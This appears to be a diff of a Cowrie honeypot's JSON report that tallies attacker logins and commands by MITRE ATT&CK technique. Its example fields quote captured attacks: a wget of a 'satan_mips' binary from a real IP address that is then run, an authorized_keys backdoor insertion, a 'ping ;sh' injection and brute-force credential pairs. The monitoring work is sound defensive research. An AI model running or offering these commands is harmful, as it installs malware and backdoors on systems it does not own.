@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-31 10:03:45",
+  "generated": "2026-08-31 11:01:45",
   "totals": {
-    "commands": 1603,
-    "login_failed": 1875,
-    "login_success": 411,
-    "sessions": 2120
+    "commands": 1784,
+    "login_failed": 1997,
+    "login_success": 457,
+    "sessions": 2269
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1875,
+      "count": 1997,
       "examples": [
         "root / root2025@",
         "root / 7ujMko0vizxv",
@@ -21,14 +21,14 @@
         "support / support"
       ],
       "first": "2026-08-31T00:00:13.861123Z",
-      "last": "2026-08-31T10:03:04.287279Z",
-      "unique_ips": 87
+      "last": "2026-08-31T11:01:31.351388Z",
+      "unique_ips": 101
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 411,
+      "count": 457,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / root",
@@ -37,8 +37,8 @@
         "root / LeitboGi0ro"
       ],
       "first": "2026-08-31T00:01:56.916034Z",
-      "last": "2026-08-31T10:03:20.879933Z",
-      "unique_ips": 45
+      "last": "2026-08-31T11:01:13.810521Z",
+      "unique_ips": 52
     },
     {
       "id": "T1105",
@@ -60,7 +60,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 71,
+      "count": 83,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./sa"
       ],
       "first": "2026-08-31T01:14:33.449575Z",
-      "last": "2026-08-31T07:57:55.384983Z",
-      "unique_ips": 5
+      "last": "2026-08-31T10:49:02.059628Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 11,
+      "count": 12,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,8 +85,8 @@
         "uname -a"
       ],
       "first": "2026-08-31T01:14:37.600310Z",
-      "last": "2026-08-31T09:04:17.261844Z",
-      "unique_ips": 10
+      "last": "2026-08-31T10:14:29.992094Z",
+      "unique_ips": 11
     },
     {
       "id": "T1059.004",
@@ -177,19 +177,19 @@
   "unmapped": [
     [
       "system",
-      365
+      405
     ],
     [
       "shell",
-      364
+      404
     ],
     [
       "sh",
-      364
+      404
     ],
     [
       "/bin/busybox UNSTABLE",
-      358
+      398
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -205,22 +205,26 @@
     ],
     [
       "enable",
-      4
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
-      4
+      5
     ],
     [
       "linuxshell",
-      3
+      4
     ],
     [
       "enablelinuxshell",
-      3
+      4
     ],
     [
       "ping ;sh",
+      4
+    ],
+    [
+      "/bin/busybox",
       3
     ],
     [
@@ -245,10 +249,6 @@
     ],
     [
       "rm /tmp/bendi.py",
-      1
-    ],
-    [
-      "/bin/busybox",
       1
     ],
     [
